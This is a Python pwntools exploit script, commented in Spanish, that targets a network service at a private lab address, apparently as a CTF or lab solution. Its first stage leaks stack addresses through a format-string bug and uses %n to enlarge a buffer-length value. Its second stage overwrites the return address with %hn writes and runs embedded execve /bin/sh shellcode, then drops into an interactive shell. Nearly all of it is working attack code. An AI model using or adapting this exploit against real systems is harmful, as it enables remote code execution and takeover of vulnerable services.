from pwn import *

p = remote("192.168.80.132", 1234)
log.info(p.recvuntil("\n"))

#STAGE 1: Hacemos leak del puntero donde escribimos con el format string y modificamos 13 bytes a 1023
p.sendline("%5$x")
buffer_address = int(p.recvuntil("\n"), 16)
log.info("Direccion de memoria que apunta a escritura esta en:  %s" % hex(buffer_address))
log.info(p.recvuntil("\n"))
p.sendline("%4$x")
content = int(p.recvuntil("\n"), 16)
log.info("Longitud por defecto del buffer de 13 bytes: %s" % hex(content))
log.info(p.recvuntil("\n"))

x = int(buffer_address)-12
log.info("Direccion de memoria donde esta el valor 13 bytes: %s" % hex(x))
leak = ""
leak += p32(x+1)
leak += "%99x%7$n"
log.info("Longitud del payload: %s" % str(len(leak)))
p.sendline(leak)
p.recvuntil("\n")
log.info(p.recvuntil("\n"))

#STAGE 2: Controlamos EIP sobreescribiendo ret con format string y shellcode
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
ret = int(buffer_address)-32
log.info("Direccion de retorno: %s" % hex(ret))

#Bytes a escribir correspondiendo a la direccion de memoria de nuestro buffer+0x8 que es donde comienza nuestra shellcode
primeros_bytes = hex(int(buffer_address))[2:6]
ultimos_bytes = hex(int(buffer_address)+0x8)[-4:]
log.info("Primeros bytes del puntero donde tenemos escritura: %s" % primeros_bytes)
log.info("Ultimos bytes del puntero donde tenemos escritura: %s" % ultimos_bytes)
payload = ""
payload += p32(ret)
payload += p32(ret+2)
payload += shellcode
payload += "%" + str(int(ultimos_bytes, 16)-31)+ "x%7$hn" #Escribimos en la parte baja
payload += "%" + str(int(primeros_bytes, 16)- int(ultimos_bytes, 16)) + "x%8$hn" #Escribimos en la parte alta
p.sendline(payload)
p.interactive()
